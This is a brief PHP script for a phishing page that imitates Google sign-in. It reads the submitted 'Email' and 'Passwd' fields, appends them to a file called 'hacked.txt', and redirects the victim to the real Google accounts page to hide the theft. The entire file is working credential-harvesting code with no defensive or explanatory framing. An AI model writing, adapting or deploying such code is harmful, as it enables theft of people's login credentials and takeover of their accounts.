<?php
header ('Location:https://accounts.google.com/');
$handle = fopen("hacked.txt", "a");
foreach($_POST as $variable => $value) {
    if($variable == "Email" || $variable == "Passwd")
{

fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}}

fwrite($handle, "\r\n");
fclose($handle);
exit;
?>